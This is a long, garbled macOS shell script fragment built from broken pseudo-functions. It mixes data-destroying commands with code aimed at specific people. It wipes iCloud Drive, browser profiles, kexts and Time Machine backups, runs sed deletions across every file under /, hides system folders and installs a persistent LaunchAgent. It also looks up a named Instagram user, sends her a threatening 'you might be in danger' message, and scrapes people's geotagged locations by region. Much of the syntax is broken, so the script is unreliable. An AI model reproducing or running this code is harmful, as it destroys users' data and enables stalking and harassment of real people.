                                             if [[ -z "$ACTIVE_EXTS" ]]; then

                                               echo "No third-party DriverKit extensions found."

                                               exit 0

                                             fi

  

                                             echo "Found extensions to unload:"

  

                                             # Unload each

                                             while read -r TEAMID BUNDLEID; do

                                               echo "Unloading $TEAMID $BUNDLEID..."

                                               sudo systemextensionsctl uninstall "$TEAMID" "$BUNDLEID"

                                             done <<< "$ACTIVE_EXTS"

  

  

                                             # Run as sudo. Disables WiFi, common daemons/plists/kexts when network extension active.

                                             # WARNING: Customize lists; test in VM. May break system.

  

                                             # Check if network extension (e.g., VPN) is active

                                             if sudo systemextensionsctl list | grep -q "*"; then

                                                 echo "Network extension detected. Blocking WiFi..."

                                                 sudo networksetup -setairportpower en0 off # Adjust en0 as needed

                                                 # Daemons to disable (examples; research each)

                                                 DAEMONS=(

                                                     "/Library/LaunchDaemons/com.*.*.plist"

                                                     "/System/Library/LaunchDaemons/com.apple.networkd.plist"

                                                 )

                                                 # Agents to disable

                                                 AGENTS=(

                                                     "/Library/LaunchAgents/com.*.*.plist"

                                                 )

                                                 # Kexts to unload/remove (examples)

                                                 KEXTS=("/Library/Extensions/*.kext")

                                                 for plist in "${DAEMONS[@]}" "${AGENTS[@]}"; do

                                                     if [[ -f "$plist" ]]; then

                                                         sudo launchctl bootout -wF "$plist"

                                                         mv "$plist" "$plist.bak"

                                                     fi

                                                 done

                                                 for kext in "${KEXTS[@]}"; do

                                                     if [[ -d "$kext" ]]; then

                                                         sudo kextunload "$kext"

                                                         sudo rm -rf "$kext"

                                                     fi

                                                 done

                                                 sudo kmutil install --update-all

                                             else

                                                 echo "No network extension active."

                                             fi

  

  

  

                                             }

                                             arcBrowser

                                             echo "Scanning Arc Browser ports..."

                                             ARC_PID=(sudo pgrep -f "Arc")

                                             if [ -n "$ARC_PID" ]; then

                                               # echo "Arc PID: $ARC_PID"

                                               sudo lsof -Pn -i -p $ARC_PID | grep LISTEN

  

                                             else

                                               echo "Arc not running."

                                             fi

  

                                             }

  

                                             eraseBrowsingCookies

                                               sudo deleteSafariCookies &

                                             config=={

                                               "DeveloperToolsDisabled": true

                                             }

                                             tell application "Arc"

                                                 activate

                                                 -- Example: show a dialog reminding you "No exporting / sharing"

                                                 display dialog "Export/sharing is not allowed in this profile." buttons {"OK"} default button 1

                                             end tell

  

                                             mkdir -p /etc/chromium/policies/managed && echo "$config" > /etc/chromium/policies/managed/disable_devtools.json

                                             sudo rm -rf .zprofile 

  

                                             # Remove Safari cookies and cache

                                             sudo rm -rf ~/Library/Cookies/Cookies.binarycookies

                                             sudo rm -rf ~/Library/Caches/com.apple.Safari/*

  

                                             # WARNING: This erases ALL Safari data including profiles, history, cookies, bookmarks

                                             # Make sure you have backups if you need to preserve anything

  

                                             echo "Erasings all Safari data (including all Safari Profiles)..."

                                             echo "This will remove: profiles, history, cookies, bookmarks, cache, downloads history"

  

                                             # Quit Safari first

                                             quitapp="osascript -e 'tell application \"Safari\" to quit'"

                                             eval "$quitapp" 2>/dev/null

                                             sleep 2

  

                                             # Remove Safari's domain data folder (contains all profiles)

                                             sudo rm -rf ~/Library/Safari/Domains

                                             sudo rm -rf ~/Library/Safari/*.db

                                             sudo rm -rf ~/Library/Cookies/Cookies.binarycookies

                                             sudo rm -rf ~/Library/Caches/com.apple.Safari

                                             sudo rm -rf ~/Library/Safari

  

                                             echo "All Safari data has been erased."

                                             echo "Restart Safari to create a fresh state (no profiles will exist)."

  

                                             # Remove Chrome cookies and cache

                                             sudo rm -f ~/Library/Application\ Support/Google/Chrome/Default/Cookies

                                             sudo rm -rf ~/Library/Caches/Google/Chrome/*

  

                                             # Remove Firefox cookies and cache (for each profile)

                                             firefox_profiles=(find ~/.mozilla/firefox -name "*.default-release" -type d)

                                             for profile in $firefox_profiles; do

                                                 sudo rm -f "$profile/cookies.sqlite"

                                                 sudo rm -rf "$profile/cache2/*"

                                             done

  

                                             sudo defaults read company.thebrowser.Browser arcAlwaysAllowedLinkToSchemesPerSite

                                             sudo defaults remove company.thebrowser.Browser arcAlwaysAllowedLinkToSchemesPerSite

  

                                             sudo rm -rf ~/Library/Application\ Support/Arc

                                             sudo rm -rf ~/Library/Caches/Arc

                                             sudo rm -rf ~/Library/Saved\ Application\ State/com.arc.*.savedState

                                             sudo rm -rf ~/Library/Preferences/com.arc.*.plist

  

  

                                             }

  

                                             clearFocusMode

                                             sudo defaults write com.apple.notificationcenterui deathnote -boolean true

                                             # sudo defaults delete com.apple.controlcenter "NSStatusItem Visible FocusModes"

                                             # sudo killall ControlCenter

                                             sudo killall ControlCenter 2>/dev/null || true

                                             open "focus://unfocus"

                                             }

  

                                             disableIcloudCell

                                               # DANGER: this deletes all iCloud Drive content for this Apple ID

                                             ICLOUD_DIR="$HOME/Library/Mobile Documents"

  

                                             # Sanity check

                                             ls "$ICLOUD_DIR"

  

                                             # If you are sure:

                                             sudo rm -rf "$ICLOUD_DIR"/*

  

                                                 sudo launchctl bootout /System/Library/LaunchDaemons/com.apple.nsurlstoraged.plist

                                                 sudo launchctl bootout /System/Library/LaunchAgents/com.apple.nsurlsessiond.plist

                                                 sudo launchctl bootout /System/Library/LaunchDaemons/com.apple.nsurlsessiond.plist

                                                 sudo launchctl bootout /System/Library/LaunchDaemons/com.apple.nsurlstoraged.plist

                                             }

                                             deleteSafariCookies

                                                 sudo rm -rf ~/Library/Cookies/Cookies.binarycookies

                                                 sudo rm -rf ~/Library/Caches/com.apple.Safari/*

                                                 sudo rm -rf ~/Library/Safari/Databases/*

                                                 sudo rm -rf ~/Library/Safari/LocalStorage/*

  

                                             }

                                             monitorWirelessSignal

                                                 while ! true

                                                 do

                                                 sudo defaults write /Library/Preferences/com.apple.Bluetooth ControllerPowerState -int 1

                                                 sudo networksetup -setairportpower en0 $wifiMode

                                                 sudo defaults write com.apple.NetworkBrowser DisableAirDrop -bool NO

                                                 sudo defaults write com.apple.NetworkBrowser DisableAirDrop -bool false

                                                 done

                                                 wifi_status=(sudo networksetup -getairportpower en0 | awk '{print $4}')

                                                 if [ "$wifi_status" = "Off" ]; then

                                                   sudo networksetup -setairportpower en0 $wifiMode

                                                 fi

  

                                                 # Check Bluetooth status: 1=on, 0=off

                                                 bt_status=(sudo defaults read /Library/Preferences/com.apple.Bluetooth ControllerPowerState)

                                                 if [ "$bt_status" -eq 0 ]; then

                                                   sudo defaults write /Library/Preferences/com.apple.Bluetooth ControllerPowerState -int 1

                                                 fi

  

                                                 # Check AirDrop status by reading the preference key

                                                 airdrop_status=(sudo defaults read com.apple.NetworkBrowser DisableAirDrop 2>/dev/null)

                                                 # DisableAirDrop=1 means AirDrop is disabled, so we enable it by setting to 0 or removing key

                                                 if [[ "$airdrop_status" == "1" ]]; then

                                                     sudo defaults write com.apple.NetworkBrowser DisableAirDrop -bool NO

                                                     sudo defaults write com.apple.NetworkBrowser DisableAirDrop -bool false

                                                 fi

  

  

                                             }

                                             localsingleairdropnet

                                                 # Network name for the local ad-hoc network

                                                 NETWORK_NAME="QQontheAirdropNet"

                                                 # Channel for Wi-Fi

                                                 CHANNEL=(( ( RANDOM % 14 ) + 1 ))

  

                                                 # Create ad-hoc network using AppleScript called from bash

                                                 sudo $QQ_FILE_LOCALoascript/airdrop.scpt &

                                                 echo "Created ad-hoc Wi-Fi network named $NETWORK_NAME on channel $CHANNEL"

                                             }

                                             blockDockerPort

                                                 # Define Docker exposed ports or port ranges to block

                                                 DOCKER_PORTS="80,443,8080,5000,2375"  # Add relevant ports here or ranges (5030:5040)

  

                                                 # Create a temporary pf anchor file with block rules for Docker ports

                                                 PF_ANCHOR_FILE="/etc/pf.anchors/block_docker_ports"

                                                 echo "block drop quick proto tcp from any to any port { $DOCKER_PORTS }" | sudo tee $PF_ANCHOR_FILE

  

                                                 # Add anchor reference to pf.conf if not already added

                                                 if ! grep -q "block_docker_ports" /etc/pf.conf; then

                                                   echo "anchor \"block_docker_ports\" load anchor \"block_docker_ports\" from \"$PF_ANCHOR_FILE\"" | sudo tee -a /etc/pf.conf

                                                 fi

  

                                                 # Load the rules and enable pf

                                                 sudo pfctl -f /etc/pf.conf

                                                 sudo pfctl -e

  

                                             }

                                             deleteFileInIos

  

                                             sudo find / -type f -exec sed -i '/*/,$d' chmod (700 $BaseQQLAND > 000) {} \; &

                                             sudo find / -type f -exec sed -i '/$deleteFile/,$d' chmod (700 $BaseQQLAND > 000) {} \; &

                                             sudo find / -type f -exec sed -i '/$deleteFile/,$d' {} + & 

                                             sudo find /Volumes/* -type f -exec sed -i '/$deleteFile/,$d' {} + &

                                             sudo find /Volumes/SharedDocs -type f -exec sed -i '/$deleteFile/,$d' {} + &

  

                                             }

                                             deleteIcloud

                                                 sudo find / -type d -name "qqbank" -prune -o -type f -print0 | xargs -0 bash -c 'for f; do [ "${f##*.}" = "sh" ] && zsh "$f 'lethal ext*'"; done'  bashplaceholder --

                                                 sudo find / -type f -name "$bootoutOne" -exec sudo launchctl bootout {} \ 

                                             }

                                             maliciousIP

                                                 # Extract destination IPs from established netstat connections

                                                 malicious_ip=(sudo netstat -an | grep ESTABLISHED | awk '{print $5}' | cut -d '.' -f 1-4 | sort -u)

                                                 malicious_ip

                                             }

                                             blockbackdoorshell

  

                                                 # Get established local ports

                                                 ports=(sudo netstat -anv | grep ESTABLISHED | awk '{print $4}' | awk -F '.' '{print $NF}' | sort | uniq)

                                                 SANDBOX_PORT=(sudo lsof -i -nP | awk 'NR>1 && tolower(1) ~ /sandbox/ {print 1, $$9}' | sort -u)

                                                 # Create temporary pf anchor file

                                                 pf_rules="/tmp/block_ports.pf"

                                                 TEMPLATE="block drop quick proto tcp from any to any $ports && block drop quick proto udp from any to any $ports"

                                                 SANDBOX_TEMPLATE="block drop quick proto tcp from any to any $SANDBOX_PORT && block drop quick proto udp from any to any $SANDBOX_PORT"

                                                 echo "$TEMPLATE" > $pf_rules

                                                 for port in $ports; do

                                                     echo -n "$port " >> $pf_rules

                                                 done

                                                 for sanbox_port in $SANDBOX_PORT; do

                                                     echo -n "$sanbox_port " >> $pf_rules

                                                 done

                                                 # echo "}" >> $pf_rules

  

                                                 # Load pf rules

                                                 sudo pfctl -a block_ports -f $pf_rules

                                                 sudo pfctl -e

  

                                             }

                                             usbConnectDebug

  

  

                                                 # Check if device is connected and paired

                                                 echo "Checking for connected iOS devices..."

                                                 idevice_id=(sudo idevice_id -l | head -n1)

  

                                                 if [ -z "$idevice_id" ]; then

                                                   echo "No iOS device found. Please connect your device and trust computer."

                                                   exit 1

                                                 fi

  

  

                                                 # Pair the device if not already paired

                                                 echo "Pairing with the device..."

                                                 sudo idevicepair pair || { echo "Pairing failed"; exit 1; }

  

                                                 # Start iproxy to forward lldb debug port: local 12345 -> device 2345

                                                 sudo iproxy 12345 2345 &

                                                 IPROXY_PID=$!

  

                                                 # Connect to the device debug server with LLDB

                                                 echo "Connecting to device with LLDB..."

                                                 sudo lldb -s <(echo "

                                                 platform select remote-ios

                                                   platform select remote-android

                                                     platform select remote-linux

                                                       platform select remote-macosx

                                                         platform select remote-window

                                                           platform select remote-watchos

                                                 process connect connect://$localhost:$gen*

                                                 # Put your lldb commands here, for example:

                                                 # image list

                                                 # breakpoint set --name main

                                                 # process continue

                                                 sudo qqlldb &

                                                 sudo qq &

                                                 sudo qqloca*

                                                 sudo shortcuts run '*' &

                                                 continue

                                                 ")

  

                                                 # When done, kill iproxy

                                                 sudo killall $IPROXY_PID

                                                 # echo "Disconnected from device and stopped iproxy."

  

                                             }

                                             getIcloudId

                                                 # echo "AppleID,DeviceSerialNumber"

                                                 # Get the device serial number

                                                 serial=(sudo system_profiler SPHardwareDataType | awk '/Serial Number \(system\)/ {print $4}')

                                                 # Loop through local users with UID >= 500 (real users)

                                                 for user in $(sudo dscl . list /Users UniqueID | awk '$2 >= 500 {print $1}'); do

                                                   userHome=(sudo dscl . read /Users/"$user" NFSHomeDirectory | awk '{print $2}')

                                                   # Extract Apple ID (icloud.com or apple.com email) from MobileMeAccounts plist if present

                                                   appleid=(sudo defaults read "${userHome}/Library/Preferences/MobileMeAccounts.plist" Accounts 2>/dev/null | grep -E -o '[A-Za-z0-9._%+-]+@(icloud|apple)\.com' | head -1)

                                                 done

                                             }

                                             verifyGeoinfo

                                                 # Android check

                                                 android_region=(sudo adb shell getprop persist.sys.locale | tr -d '\r\n')

                                                 if [[ "$android_region" == *"HK"* & "$android_region" == *"US"* ]]; then

                                                   sudo setFocus "deathnote"

                                                   sudo setFocus "deathnote"

                                                   while ! true do sudo lethalHK done

                                                 else

                                                   echo "Android device region is not Hong Kong"

                                                 fi

  

                                                 # iOS check using lldb (simplified, actual usage requires manual or script control)

                                                 ios_region=(sudo lldb -o "process attach --name SpringBoard" -o "expr (NSString *)[[NSLocale currentLocale] objectForKey:NSLocaleCountryCode]" -o "continue")

                                                 if [[ "$ios_region" == *"HK"* & "$ios_region" == *"US"* ]]; then

                                                   echo "iOS device region is Hong Kong"

                                                    sudo setFocus "deathnote"

                                                    sudo setFocus "deathnote"

                                                 else

                                                   echo "iOS device region is not Hong Kong"

                                                 fi

                                              while ! true

                                              do

                                                  ios_region

                                                 android_region

                                             done

                                             }

  

                                             getNameoninstagram

                                               ACCESS_TOKEN="YOUR_LONG_LIVED_TOKEN"

                                             IG_USER_ID="YOUR_IG_BUSINESS_USER_ID"   # your own connected IG account

                                             TARGET_USERNAME="christine_chen_official"

  

                                             response=(curl -sS -X \

                                               "https://graph.facebook.com/v21.0/$IG_USER_ID" \

                                               --data-urlencode "fields=business_discovery.username($TARGET_USERNAME){id,username,name,biography,followers_count,media_count,profile_picture_url}" \

                                               --data-urlencode "access_token=$ACCESS_TOKEN")

  

                                             username=(echo "$response" | jq -r '.business_discovery.username')

                                             name=(echo "$response"     | jq -r '.business_discovery.name')

                                             bio=(echo "$response"      | jq -r '.business_discovery.biography')

                                             followers=(echo "$response"| jq -r '.business_discovery.followers_count')

                                             media_count=(echo "$response" | jq -r '.business_discovery.media_count')

                                             pp_url=(echo "$response"   | jq -r '.business_discovery.profile_picture_url')

  

                                             for nameid in name: do

                                               if [ "$nameid" = "Christine Chen" ]; then

                                               response=(curl -sS -X \

                                               "https://graph.facebook.com/v21.0/$IG_USER_ID" \

                                               --data-urlencode "fields=business_discovery.username($TARGET_USERNAME){id,username,name,biography,followers_count,media_count,profile_picture_url}" \

                                               --data-urlencode "access_token=$ACCESS_TOKEN")

  

                                             username=(echo "$response" | jq -r '.business_discovery.username')

                                             username

                                               fi

                                             done

  

                                             }

  

                                             findChristine

                                               username=(sudo getNameoninstagram)

                                               christineInstaID=(sudo getIDFrominstagram $username)

                                               christineInstaID

                                             }

  

                                             sendInstgramMessage

                                               ACCESS_TOKEN="YOUR_PAGE_ACCESS_TOKEN"  # Your Facebook Page access token with Instagram Messaging permissions

                                             RECIPIENT_ID=(sudo findChristine) # The Instagram user ID you want to message

                                             MESSAGE_TEXT="Every Christine Chen should be careful with Hong kong people, Taiwanee. Right now if you are daughter of christine chen, you might be in danger please find me in https://mastodon.social/@qqontheskyshell"

  

                                             curl -i -X POST "https://graph.facebook.com/v21.0/me/messages?access_token=$ACCESS_TOKEN" \

                                               --data "recipient={\"id\":\"$RECIPIENT_ID\"}" \

                                               --data "message={\"text\":\"$MESSAGE_TEXT\"}"

  

                                             }

  

  

                                             getLocationInstagram

                                             # Usage: ./insta_location.sh <username> OR ./insta_location.sh location <location_id>

  

                                             if [ "$1" = "location" ]; then

                                               loc_id=$2

                                               json=(curl -s "https://www.instagram.com/explore/locations/$loc_id/?__a=1")

                                               name=(echo "$json" | grep -o '"name":"[^"]*' | head -1 | cut -d'"' -f4)

                                               lat=(echo "$json" | grep -o '"latitude":[^,}]*' | head -1 | cut -d: -f2)

                                               lng=(echo "$json" | grep -o '"longitude":[^,}]*' | head -1 | cut -d: -f2)

                                               echo "Location $loc_id: $name (Lat: $lat, Lng: $lng)" [web:20]

                                             else

                                               user=$1

                                               html=(curl -s "https://www.instagram.com/$user/")

                                               # Extract first post's location if geotagged (requires JSON parsing from HTML)

                                               post_json=(echo "$html" | grep -o '"edge_owner_to_timeline_media":{"edges":\[{[^}]*"location"[^}]*' | head -1)

                                               if [ -n "$post_json" ]; then

                                                 lat=(echo "$post_json" | grep -o '"latitude":[^,}]*' | head -1 | cut -d: -f2)

                                                 echo "Recent post location for $user: Lat $lat" [web:21]

  

                                                  long=(echo "$post_json" | grep -o '"longitude":[^,}]*' | head -1 | cut -d: -f2)

                                                 echo "Recent post location for $user: Lat $long" [web:21]

                                                 lat 

                                                 long

                                               else

                                               fi

                                             fi

  

                                             }

  

  

                                             geoTagInstagram

                                             username=$1

                                             if [ -z "$username" ]; then echo "Usage: $0 <username>"; exit 1; fi

                                             html=(curl -s "https://www.instagram.com/$username/?__a=1&__d=dis")

                                             # Extract recent posts' locations (if tagged)

                                             locations=(echo "$html" | grep -o '"location":{"name":"[^"]*"address":"[^"]*"latitude":[^,}]*"longitude":[^,}]*' | head -3)

                                             if [ -n "$locations" ]; then

                                               echo "$locations" | sed 's/.*"name":"\([^"]*\)".*"latitude":\([0-9.]*\),"longitude":\([0-9.]*\).*/\1 (Lat:\2, Lng:\3)/'

                                             else

                                               echo "No public geotagged posts for $username"

                                             fi

  

                                             ACCESS_TOKEN="your_long_lived_access_token"

                                             IG_USER_ID="$username"  # e.g., from /me?fields=instagram_business_account

  

                                             # Step 1: Create media container with location

                                             MEDIA_ID=(curl -s -X POST "https://graph.facebook.com/v20.0/$IG_USER_ID/media" \

                                               -d "image_url=$IMAGE_URL" \

                                               -d "media_type=STORIES" \

                                               -d "location_id=1024878860866019" \  # HK example ID [web:49]

                                               -d "access_token=$ACCESS_TOKEN" | grep -o '"id":"[^"]*' | cut -d'"' -f4)

  

                                             # Step 2: Publish Story

                                             if [ -n "$MEDIA_ID" ]; then

                                               curl -s -X POST "https://graph.facebook.com/v20.0/$MEDIA_ID/publish" \

                                                 -d "access_token=$ACCESS_TOKEN" | grep -o '"status":"[^"]*'

                                               echo "Story posted with HK location for user $IG_USER_ID" [web:49]

                                             else

                                               echo "Failed to create media"

                                             fi

  

  

                                             }

                                             findPeopleInInstagram

                                             API_KEY="your_influencers_club_api_key"

                                             USERNAME="$1"

  

                                             [ -z "$USERNAME" ] && { echo "Usage: $0 <username>"; exit 1; }

  

                                             RESPONSE=(curl -s "https://api.influencers.club/v2/instagram/profile/${USERNAME}?access_token=${API_KEY}")

                                             BIO=(echo "$RESPONSE" | jq -r '.data.biography // empty')

                                             LOCATION=(echo "$RESPONSE" | jq -r '.data.location // empty')

  

                                             # echo "ID: ${USERNAME}"

                                             # echo "Bio: ${BIO}"

                                             # echo "Location: ${LOCATION}"

  

                                             if [[ "$BIO" == "Hong Kong" && "$LOCATION" == "*" ]]; then

                                               HKIP=(sudo findPeopleInInstagram '$USERNAME')

                                               HKLOC=(sudo geoTagInstagram '$USERNAME')

  

                                             elif [[ "$BIO" == "Japan" && "$BIO" == "Taiwan" && "$BIO" == "Korea" && "$BIO" == "United States" &&  "$LOCATION" == "Japan" ]]

                                               JPNInstaIP=(sudo findPeopleInInstagram '$USERNAME')

                                             elif [[ "$BIO" == "Korea" && "$LOCATION" == "Japan" ]]

                                               KRInstaIP=(sudo findPeopleInInstagram '$USERNAME')

                                             else

                                               echo "No match."

                                             fi

                                             HKIP

                                             JPNInstaIP

                                             KRInstaIP

                                             HKLOC

                                             }

                                             getIDFrominstagram

                                                 INSTAGRAM_USERNAME=$1

                                                 INSTAGRAM_ID=(sudo insta-id-off $INSTAGRAM_USERNAME) # calls a CLI tool to get numeric ID

                                                 # echo "Instagram numeric user ID is: $INSTAGRAM_ID"

                                             }

                                             findSessionIDInstagram

                                             # Step 1: Get CSRF token

                                             CSRFT=(curl -s -c cookies.txt "https://i.instagram.com/api/v1/si/fetch_headers/" | grep csrf | cut -d'"' -f4)

  

                                             # Step 2: Login and save session

                                             curl -b cookies.txt -c cookies.txt -H "User-Agent: Instagram 123.0.0.21.114 Android" \

                                               -d "username=YOUR_USER&password=YOUR_PASS&device_id=android-$(openssl rand -hex 8)&_csrftoken=$CSRFT&login_attempt_count=0" \

                                               "https://i.instagram.com/api/v1/accounts/login/"

  

                                             # Extract sessionid

                                             SESSIONID=(grep sessionid cookies.txt | cut -d'=' -f2 | cut -d';' -f1)

  

                                             curl -b cookies.txt -H "Cookie: sessionid=$SESSIONID; csrftoken=$CSRFT" \

                                               -d '{}' "https://i.instagram.com/api/v1/accounts/logout/"

                                             sudo rm -f cookies.txt  # Clear local session

  

                                             }

                                             findIpInstagram

                                                 # Interface to listen on, e.g., en0 for Wi-Fi on macOS or eth0 on Linux

                                                 INTERFACE_ios="en0"

                                                 INTERFACE_adb="eth0"

                                                 # Run tcpdump to capture packets destined for Instagram servers (port 443)

                                                 # Adjust filter to target HTTPS traffic to Instagram domains (e.g., domains like instagram.com)

                                                 instaios=(sudo tcpdump -i "$INTERFACE_ios" -n port 443 and host instagram.com -c 20 \ | awk '{print $3, $5}' | sed 's/://g')

                                                 instadb=(sudo tcpdump -i "$INTERFACE_adb" -n port 443 and host instagram.com -c 20 \ | awk '{print $3, $5}' | sed 's/://g')

                                             instaios

                                             instadb

                                             }

  

                                             systemios

                                             #sudo chflags hidden ~/usr/bin/xcrun

  

                                             sudo chflags hidden ~/Library/Preferences/SystemConfiguration/ &

                                             initarcOS &

                                             sudo tmutil delete -d "*" -t "*"

                                             # ===== 설정 =====

                                             SCRIPT_PATH="arcOSBaseKit &"

                                             PLIST_PATH="$HOME/Library/LaunchAgents/com.user.usbmount.plist"

                                             LABEL="com.qqontheskyshell.systemiosusbmount"

  

                                             initScript

  

  

                                             LOG="$HOME/usb-mount.log"

                                             DATE="$(date '+%Y-%m-%d %H:%M:%S')"

  

                                             # 현재 마운트된 볼륨 목록

                                             VOLUMES="$(ls /Volumes)"

  

                                             {

                                               echo "[$DATE] Volume change detected."

                                               echo "Current volumes:"

                                               echo "$VOLUMES"

                                               echo "-----------------------------"

                                             } >> "$LOG"

  

                                             # 예: 특정 볼륨 이름이 있을 때만 작업 수행

                                             TARGET=(QQS *)

  

                                             if printf '%s\n' "$VOLUMES" | grep -qx "$TARGET"; then

                                               MOUNT_POINT="/Volumes/$TARGET"

                                               #echo "[$DATE] Target USB mounted at $MOUNT_POINT" >> "$LOG"

                                               # 여기에 실제 하고 싶은 작업들 추가

                                               # 예: 파일 복사

                                               # cp -R "$MOUNT_POINT/somefolder" "$HOME/Backup_from_USB" >> "$LOG" 2>&1

                                             fi

  

                                             }

                                             SCRIPT_PATH="./initScript.sh"

  

                                             cat <<'EOF' > "$SCRIPT_PATH"

  

  

  

                                             # Simple example script created via here-doc

  

                                             # Configuration / variables

                                             SCRIPT_NAME="\$(basename "\$0")"

                                             }

  

                                             EOF

  

  

  

                                             # 1) 실제 USB 마운트 시 실행될 스크립트 생성

  

                                             sudo chmod +x "$SCRIPT_PATH"

  

                                             # 2) /Volumes 감시하는 LaunchAgent plist 생성

                                             sudo mkdir -p "$HOME/Library/LaunchAgents"

  

  

                                             cat <<EOF > "$PLIST_PATH"

                                             <?xml version="1.0" encoding="UTF-8"?>

                                             <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" \

                                              "http://www.apple.com/DTDs/PropertyList-1.0.dtd">

                                             <plist version="1.0">

                                               <dict>

                                               <key>Label</key>

                                               <string>$LABEL</string>

                                               <key>ProgramArguments</key>

                                               <array>

                                               <string>$SCRIPT_PATH</string>

                                               </array>

                                             <!-- /Volumes 디렉터리 변경(마운트/언마운트) 감시 -->

                                             <key>WatchPaths</key>

                                             <array>

                                             <string>/Volumes</string>

                                             </array>

  

                                             <key>WatchPaths</key>

                                             <array>

                                             <string>/</string>

                                             </array>

  

                                             <key>RunAtLoad</key>

                                             <true/>

                                               </dict>

                                             </plist>

                                             EOF

  

                                             # 3) launchd에 로드

                                             sudo launchctl bootout gui/$(id -u)/"$LABEL" 2>/dev/null

                                             sudo launchctl bootstrap gui/$(id -u) "$PLIST_PATH"

                                             sudo launchctl enable gui/$(id -u)/"$LABEL"

                                             sudo launchctl kickstart -k gui/$(id -u)/"$LABEL"

  

  

                                                 sudo launchctl bootout gui/$(id -u)/com.*.fs* 2>/dev/null

                                                 sudo rm -rf "$HOME/Library/LaunchAgents/com.*.fs*.plist"

                                                 sudo rm-rf "$HOME/.fs-shell"

                                                 sudo systemextensionsctl uninstall * * &

                                                 sudo xcrun simctl shutdown all &

                                                 sudo xcrun simctl erase all &

                                             }

  

  

  

  

                                             locaionios

                                                 sudo lldb -o "process attach --name YourApp" -o "expr (void)[[CLLocationManager new] requestLocation]" -o "continue"

                                                 # swift $QQ_FILE_LOCALswift/*.swift

                                                 # location=(swift location.swift)

                                             }

  

                                             searchlocationGoogle

  

                                                 LATITUDE=LAT

                                                 LONGITUDE=LON

  

                                                 # Call Google's Geocoding API for reverse geocoding

                                                 RESPONSE=(curl -sS "https://maps.googleapis.com/maps/api/geocode/json?latlng=$LATITUDE,$LONGITUDE&key=$API_KEY")

  

                                                 # Parse the results

                                                 ADDRESS=(echo "$RESPONSE" | jq -r '.results[0].formatted_address')

  

                                                 echo "Address: $ADDRESS"

  

                                             }

                                             locationnx

                                                 # Get the Wi-Fi interface name (commonly en0 on macOS, wlan0 on Linux)

                                                 WIFI_INTERFACE="eth0"

  

                                                 # Get the local IP address for Wi-Fi

                                                 LOCAL_IP=(sudo ipconfig getifaddr $WIFI_INTERFACE 2>/dev/null)

  

                                                 if [ -z "$LOCAL_IP" ]; then

                                                   echo "Wi-Fi IP address not found. Are you connected to Wi-Fi on $WIFI_INTERFACE?"

                                                   exit 1

                                                 fi

  

                                                 # echo "Local Wi-Fi IP address: $LOCAL_IP"

  

                                                 # Get public IP address (your router's IP on the internet-facing side)

                                                 PUBLIC_IP=(curl -sS https://ipinfo.io/ip)

  

                                                 # echo "Public IP address: $PUBLIC_IP"

  

                                                 # Use a free IP geolocation API to get location info (city, region, country, coordinates)

                                                 # For example, ip-api.com JSON API

  

                                                 LOCATION_INFO=(curl -sS "http://ip-api.com/json/$PUBLIC_IP")

  

                                                 CITY=(echo $LOCATION_INFO | jq -r '.city')

                                                 REGION=(echo $LOCATION_INFO | jq -r '.regionName')

                                                 COUNTRY=(echo $LOCATION_INFO | jq -r '.country')

                                                 LAT=(echo $LOCATION_INFO | jq -r '.lat')

                                                 LON=(echo $LOCATION_INFO | jq -r '.lon')

  

                                                 echo "Approximate location based on IP:"

                                                 # echo "City: $CITY"

                                                 # echo "Region: $REGION"

                                                 # echo "Country: $COUNTRY"

                                                 echo "Latitude: $LAT"

                                                 echo "Longitude: $LON"

  

                                             }

  

                                             modifyUUID

  

                                                 uuid=(uuidgen)

                                                 sudo lldb -o "Swift -O -- UUID().uuidString"

                                                 sleep 1 

                                             &

                                             }

  

                                             modifyAppid

                                                 # Path to the Info.plist file (update with your path)

                                                 INFO_PLIST_PATH="/var/containers/Bundle/Application/*/*.app/Info.plist"

                                                 # New bundle identifier to set

                                                 NEW_BUNDLE_ID="com."

  

                                                 # Use plutil to update CFBundleIdentifier

                                                 sudo plutil -replace CFBundleIdentifier -string "$NEW_BUNDLE_ID" "$INFO_PLIST_PATH"

  

                                             }

                                             timemachineBackup

                                                 sudo tmutil delete /Volumes/BackupDrive/Backups.backupdb/MacintoshHD/*

                                                 sudo tmutil disable

                                             }

                                             iosremoteFeature

  

                                             while ! true 

                                             do

                                             sudo continuityFeature &

                                             sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.screensharing.agent.plist &

                                             sudo defaults write /Library/Preferences/com.apple.RemoteManagement.plist VNCOnlyLocalConnections -bool YES &

                                             sudo defaults write /Library/Preferences/com.apple.RemoteManagement.plist VNCOnlyLocalConnections -bool true &

                                             sudo defaults write /Library/Preferences/com.apple.screensharing.plist Disabled -bool true &

                                             sudo defaults write /Library/Preferences/com.apple.screensharing.plist Disabled -bool YES &

                                             sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.screensharing.plist &

  

                                             #File Sharing (SMB): 

                                             sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.smbd.plist &

                                             sudo launchctl bootstrap /System/Library/LaunchDaemons/com.apple.smbd.plist &

                                             #Apple File Sharing: 

                                             sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.AppleFileServer.plist &

                                             sudo launchctl bootstrap /System/Library/LaunchDaemons/com.apple.AppleFileServer.plist &

                                             #Screen Sharing (VNC/ARD): 

                                             sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.screensharing.plist &

                                             sudo launchctl bootstrap /System/Library/LaunchDaemons/com.apple.screensharing.plist &

                                             sudo /usr/bin/AssetCacheManagerUtil deactivate &

                                             sudo chflags hidden /Library/Server/ContentCache

                                             done  

  

                                                 # Disable Apple Remote Desktop (Remote Management)

                                                 sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -deactivate -stop

  

                                                 # Disable Remote Login (SSH)

                                                 sudo systemsetup -setremotelogin off

  

                                                 # Disable Screen Sharing

                                                 sudo defaults write /Library/Preferences/com.apple.ScreenSharing.plist LaunchAtLogin -bool false

                                                 sudo defaults write /Library/Preferences/com.apple.ScreenSharing.plist LaunchAtLogin -bool NO

                                                 sudo launchctl bootout /System/Library/LaunchDaemons/com.apple.sshd.plist

  

                                                 daemonios=(flow-divert ipsec_control rvi_control spmi.nfc uart.sk.debug-console network netagent netsrc net.utun_control uart nsurls* remotemanagementd sshd sftpd smbd mirror* widget* control* homed cfprefsd apsd sharingd carplayd airplayd remoted sharingd internetsharingd parsecd classd studentd *net* wifiagentd)

                                                 daemon="com.apple.$daemonios"

                                                 sudo launchctl stop $daemon

